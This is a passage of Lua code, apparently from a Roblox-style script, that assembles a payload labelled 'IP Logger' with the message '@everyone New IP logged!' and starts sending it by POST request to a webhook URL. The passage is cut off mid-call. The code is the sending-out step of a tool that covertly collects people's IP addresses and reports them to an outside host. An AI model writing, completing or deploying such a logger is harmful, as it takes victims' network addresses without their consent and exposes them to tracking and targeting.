}

local payload = {
    username = "IP Logger",
    embeds = {embed},
    content = "@everyone New IP logged!"
}

pcall(function()
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
